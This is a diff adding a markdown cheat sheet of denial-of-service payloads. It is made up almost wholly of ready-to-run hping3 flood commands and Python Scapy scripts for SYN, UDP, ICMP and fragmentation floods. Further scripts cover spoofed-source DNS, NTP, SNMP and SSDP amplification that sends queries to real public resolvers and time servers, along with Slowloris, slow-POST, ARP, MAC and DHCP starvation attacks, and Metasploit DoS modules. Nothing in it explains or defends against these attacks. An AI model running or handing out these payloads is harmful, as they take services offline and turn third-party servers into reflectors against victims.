@@ -1,0 +1,358 @@
+# Denial of Service (DoS) and Distributed DoS Attack Payloads
+
+## Network Layer DoS
+
+### SYN Flood
+hping3 -S --flood -V -p 80 192.168.1.100                               # SYN flood
+hping3 -S --flood --rand-source -p 80 192.168.1.100                    # Spoofed source
+hping3 -c 1000000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.100
+nmap -sS --max-rate 10000 -p 80 192.168.1.100                          # High rate SYN
+
+# Scapy SYN flood
+python3 << 'EOF'
+from scapy.all import *
+target_ip = "192.168.1.100"
+target_port = 80
+while True:
+    send(IP(dst=target_ip, src=RandIP())/TCP(dport=target_port, flags="S"), verbose=0)
+EOF
+
+### ACK Flood
+hping3 -A --flood -p 80 192.168.1.100                                  # ACK flood
+hping3 -A --flood --rand-source -p 80 192.168.1.100                    # Spoofed ACK
+
+### UDP Flood
+hping3 -2 --flood -p 53 192.168.1.100                                  # UDP flood
+hping3 -2 --flood --rand-source -p 53 192.168.1.100                    # Spoofed UDP
+hping3 -2 --flood -p 0 --rand-dest 192.168.1.0/24                      # Random ports
+
+# Scapy UDP flood
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+send(IP(dst=target)/UDP(dport=RandShort())/Raw(load=RandString(size=1024)), loop=1, verbose=0)
+EOF
+
+### ICMP Flood (Ping Flood)
+ping -f 192.168.1.100                                                  # Ping flood (requires root)
+ping -f -s 65507 192.168.1.100                                         # Large packet flood
+hping3 -1 --flood 192.168.1.100                                        # ICMP flood
+hping3 -1 --flood --rand-source 192.168.1.100                          # Spoofed ICMP
+
+### RST Flood
+hping3 -R --flood -p 80 192.168.1.100                                  # RST flood
+hping3 -R --flood --rand-source -p 80 192.168.1.100                    # Spoofed RST
+
+### FIN Flood
+hping3 -F --flood -p 80 192.168.1.100                                  # FIN flood
+hping3 -F --flood --rand-source -p 80 192.168.1.100                    # Spoofed FIN
+
+### PUSH+ACK Flood
+hping3 -PA --flood -p 80 192.168.1.100                                 # PUSH+ACK flood
+
+### Fragmentation Attack
+hping3 -c 10000 -d 65495 --frag -S -p 80 192.168.1.100                 # Fragmented SYN
+hping3 --flood -d 1000 --frag 192.168.1.100                            # Fragment flood
+
+## Amplification Attacks
+
+### DNS Amplification
+# Using open DNS resolvers
+dig @8.8.8.8 isc.org ANY +edns=0 +bufsize=4096                         # Test amplification
+
+# Amplification attack (spoofed source)
+hping3 -2 -p 53 --flood --rand-source -d 512 8.8.8.8                   # UDP flood to DNS
+
+# Scapy DNS amplification
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"  # Victim
+dns_servers = ["8.8.8.8", "1.1.1.1", "208.67.222.222"]
+for dns in dns_servers:
+    send(IP(src=target, dst=dns)/UDP(sport=RandShort(), dport=53)/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY")), count=1000, verbose=0)
+EOF
+
+### NTP Amplification
+nmap -sU -p 123 --script=ntp-monlist 192.168.1.100                     # Find NTP servers
+ntpdc -n -c monlist 192.168.1.100                                      # NTP monlist
+
+# NTP amplification attack
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+ntp_servers = ["time.google.com", "time.cloudflare.com"]
+for ntp in ntp_servers:
+    send(IP(src=target, dst=ntp)/UDP(sport=123, dport=123)/Raw(load="\x17\x00\x03\x2a" + "\x00" * 4), count=100)
+EOF
+
+### SNMP Amplification
+onesixtyone -c community.txt -i ntp_servers.txt                        # Find SNMP servers
+snmpwalk -v 2c -c public 192.168.1.100                                 # SNMP query
+
+# SNMP amplification
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+snmp_servers = ["192.168.1.50", "192.168.1.51"]
+for snmp in snmp_servers:
+    send(IP(src=target, dst=snmp)/UDP(sport=161, dport=161)/SNMP(), count=100)
+EOF
+
+### SSDP Amplification
+# Scan for SSDP devices
+nmap -sU -p 1900 --script=upnp-info 192.168.1.0/24
+
+# SSDP amplification
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+ssdp_request = 'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMan:"ssdp:discover"\r\nMX:3\r\n\r\n'
+send(IP(src=target, dst="239.255.255.250")/UDP(sport=1900, dport=1900)/Raw(load=ssdp_request), count=100)
+EOF
+
+### Memcached Amplification
+# Find memcached servers
+nmap -sU -p 11211 --script=memcached-info 192.168.1.0/24
+
+# Memcached amplification
+echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u 192.168.1.100 11211
+
+## Application Layer DoS
+
+### HTTP GET Flood
+# Using Apache Bench
+ab -n 100000 -c 100 http://192.168.1.100/                              # 100k requests, 100 concurrent
+
+# Using Siege
+siege -c 100 -r 1000 http://192.168.1.100                              # 100 concurrent, 1000 repetitions
+
+# Using HTTPFlood
+python3 << 'EOF'
+import requests
+import threading
+
+target = "http://192.168.1.100"
+def attack():
+    while True:
+        try:
+            requests.get(target)
+        except:
+            pass
+
+for i in range(100):
+    thread = threading.Thread(target=attack)
+    thread.start()
+EOF
+
+### HTTP POST Flood
+# Using hping3
+hping3 -S -p 80 --flood --rand-source 192.168.1.100
+
+# Using curl
+for i in {1..1000}; do curl -X POST http://192.168.1.100/login -d "user=admin&pass=test" & done
+
+### Slowloris Attack
+slowloris -s 500 192.168.1.100                                         # 500 connections
+slowloris -s 500 -p 80 -ua 192.168.1.100                               # Custom settings
+
+# Python Slowloris
+python3 << 'EOF'
+import socket
+import time
+import random
+
+target = "192.168.1.100"
+port = 80
+sockets = []
+
+for i in range(500):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
+        sockets.append(s)
+    except:
+        pass
+
+while True:
+    for s in sockets:
+        try:
+            s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+        except:
+            sockets.remove(s)
+    time.sleep(15)
+EOF
+
+### R.U.D.Y (Slow POST)
+# R-U-Dead-Yet attack
+python3 << 'EOF'
+import socket
+import time
+target = "192.168.1.100"
+port = 80
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.send(b"POST /login HTTP/1.1\r\n")
+s.send(f"Host: {target}\r\n".encode())
+s.send(b"Content-Length: 1000000\r\n\r\n")
+while True:
+    s.send(b"X")
+    time.sleep(0.1)
+EOF
+
+### Slowread Attack
+# Keep connection open by reading slowly
+python3 << 'EOF'
+import socket
+import time
+target = "192.168.1.100"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, 80))
+s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+while True:
+    s.recv(1)  # Read 1 byte at a time
+    time.sleep(5)
+EOF
+
+### HULK (HTTP Unbearable Load King)
+# Random URL generation DoS
+# git clone https://github.com/grafov/hulk
+# python hulk.py http://192.168.1.100
+
+### GoldenEye
+# goldeneye http://192.168.1.100 -w 500 -s 1000                        # 500 workers, 1000 sockets
+
+## SSL/TLS DoS
+
+### SSL Renegotiation DoS
+# Using THC-SSL-DOS
+thc-ssl-dos 192.168.1.100 443 --accept                                 # SSL DoS
+
+### SSL Handshake Flood
+while true; do openssl s_client -connect 192.168.1.100:443 & done      # SSL handshake flood
+
+## DNS DoS
+
+### DNS Query Flood
+# Using dnsflood
+dnsflood target.com 192.168.1.100                                      # DNS flood
+
+# Using hping3
+hping3 -2 --flood -p 53 192.168.1.100                                  # UDP flood to DNS
+
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+target = "192.168.1.100"
+while True:
+    send(IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=RandString(10)+".com")), verbose=0)
+EOF
+
+### DNS NXDOMAIN Flood
+# Random subdomain queries
+python3 << 'EOF'
+from scapy.all import *
+import random
+import string
+target = "192.168.1.100"
+while True:
+    subdomain = ''.join(random.choices(string.ascii_lowercase, k=10))
+    send(IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f"{subdomain}.example.com")), verbose=0)
+EOF
+
+## Layer 2 DoS
+
+### MAC Flooding
+macof -i eth0                                                          # MAC flood
+macof -i eth0 -n 1000                                                  # 1000 packets
+
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+while True:
+    sendp(Ether(src=RandMAC(), dst=RandMAC())/IP(src=RandIP(), dst=RandIP())/ICMP(), iface="eth0", verbose=0)
+EOF
+
+### ARP Flood
+# Using Scapy
+python3 << 'EOF'
+from scapy.all import *
+while True:
+    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=RandIP(), hwsrc=RandMAC(), pdst=RandIP()), iface="eth0", verbose=0)
+EOF
+
+### DHCP Starvation
+yersinia -I                                                            # Interactive DHCP attack
+dhcpstarv -i eth0                                                      # DHCP starvation
+
+## SIP/VoIP DoS
+
+### SIP INVITE Flood
+# Using SIPp
+sipp -sn uac -r 100 -m 10000 192.168.1.100                             # 100 calls/sec
+
+# Using inviteflood
+inviteflood eth0 target@192.168.1.100 192.168.1.50 5060 1000           # 1000 INVITEs
+
+## IPv6 DoS
+
+### IPv6 Router Advertisement Flood
+atk6-flood_router6 eth0                                                # RA flood
+atk6-flood_advertise6 eth0                                             # Advertisement flood
+
+### ICMPv6 Flood
+atk6-dos-new-ip6 eth0                                                  # New IP DoS
+atk6-flood_solicitate6 eth0                                            # Solicitation flood
+
+## Distributed DoS (DDoS)
+
+### Using LOIC (Low Orbit Ion Cannon)
+# GUI-based, point at target
+# Set threads, select attack method (TCP, UDP, HTTP)
+
+### Using HOIC (High Orbit Ion Cannon)
+# GUI-based, supports booster scripts
+# Can target multiple URLs
+
+### Metasploit Auxiliary Modules
+msfconsole -q -x "use auxiliary/dos/tcp/synflood; set RHOST 192.168.1.100; run"
+msfconsole -q -x "use auxiliary/dos/http/apache_range_dos; set RHOST 192.168.1.100; run"
+msfconsole -q -x "use auxiliary/dos/http/slowloris; set RHOST 192.168.1.100; run"
+msfconsole -q -x "use auxiliary/dos/dns/nameserver; set RHOST 192.168.1.100; run"
+
+### Using Multiple Attack Vectors
+# Combined SYN + UDP + ICMP flood
+hping3 -S --flood -p 80 192.168.1.100 &
+hping3 -2 --flood -p 53 192.168.1.100 &
+hping3 -1 --flood 192.168.1.100 &
+
+## Resource Exhaustion
+
+### Connection Exhaustion
+# Open many connections
+for i in {1..1000}; do nc 192.168.1.100 80 & done                      # 1000 connections
+
+### CPU Exhaustion
+# SSL handshake
+while true; do openssl s_client -connect 192.168.1.100:443 < /dev/null & done
+
+### Memory Exhaustion
+# Large POST requests
+curl -X POST -d @largefile.bin http://192.168.1.100/upload
+
+### Bandwidth Saturation
+# Large file download requests
+for i in {1..100}; do curl -O http://192.168.1.100/largefile.iso & done
+
+## Reflected/Amplified DDoS Tools
+
+### Saddam
+# Saddam DNS amplification tool
+# python saddam.py -t 192.168.1.100 -f resolvers.txt -p 53
+
+### DNS-Amplifier
+# python dns-amp.py -t 192.168.1.100 -f dns-servers.txt
+
+### Memcrashed
+# Memcached amplification
+# python memcrashed.py -t 192.168.1.100 -f memcached-servers.txt
